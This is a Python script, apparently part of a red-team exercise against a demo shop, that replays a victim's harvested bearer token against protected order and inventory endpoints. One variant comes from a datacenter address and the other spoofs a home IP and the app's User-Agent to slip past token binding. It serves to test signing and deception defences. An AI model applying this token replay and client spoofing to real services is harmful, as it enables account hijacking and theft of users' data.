"""
Round 5 attack: replay a harvested bearer token, twice.

A bearer token is a bearer instrument: hold it and you can use it. Here the attacker has captured a victim's token
(via the MitM of W3 Ch1, a leaked log, or an infostealer) but *not* the per-token signing secret, which the
first-party client never transmits. To get a token to replay, this script logs in once as the victim from a
home address with the app's User-Agent - the stand-in for the captured session - then throws the signing secret
away and replays only the token, unsigned, against the two protected reads:

  replay          from the attacker's own datacenter address and a script User-Agent. Token binding (network class
                  and UA family) already notices the client changed.
  replay_spoofed  from another *home* address with the app's User-Agent copied: the attacker has learned what the
                  binding looks at. Only the signature, which the attacker cannot forge, stops this one.

What the attacker wants: the victim's orders, and the true price of the drop. At DEFENSE_LEVEL<5 both come back.
At level 5 the orders read is refused outright, and the inventory read is *deceived* (200 OK with poisoned
numbers), so the attacker leaves with a price that is not the real one and no idea it was caught.

    python attacks/round5_token_replay.py [--spoof]
"""

import argparse

from _common import APP_UA, DROP_SKU, SCRIPT_UA, ApiApp, bot_ip, finish, world_pool
from demo_site.seed import password_for, username

ACTOR = "bot:r5_replay"
VICTIM = 120                                  # a seed account that has orders; no shopper uses it


def capture_token():
    """Stand-in for token harvesting: obtain the victim's token (the signing secret is deliberately dropped)."""
    app = ApiApp("human:victim:00", world_pool("home_broadband")[40], ua=APP_UA)
    r = app.login(username(VICTIM), password_for(VICTIM))
    r.raise_for_status()
    return app.token


def run(spoof=False):
    token = capture_token()
    app = ApiApp(ACTOR, world_pool("home_broadband")[41] if spoof else bot_ip(4), ua=APP_UA if spoof else SCRIPT_UA)
    app.token = token                          # replayed as is; app.secret stays None, so nothing is signed
    real = ApiApp(ACTOR, bot_ip(4), ua=SCRIPT_UA).get(f"/api/products/{DROP_SKU}").json().get("price")
    ro = app.get("/api/v2/account/orders")
    ri = app.get(f"/api/v2/inventory/{DROP_SKU}")
    orders = ro.json().get("total", 0) if ro.status_code == 200 else 0
    price = ri.json().get("item", {}).get("price") if ri.status_code == 200 else None
    got = (ro.status_code == 200 and orders > 0) + (price is not None and price == real)
    return finish("round5_replay_spoofed" if spoof else "round5_replay", 2, int(got), "protected reads that told the truth",
                  orders_status=ro.status_code, orders_read=orders, inventory_status=ri.status_code,
                  inventory_price=price, real_price=real, poisoned=price is not None and price != real)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--spoof", action="store_true")
    run(ap.parse_args().spoof)
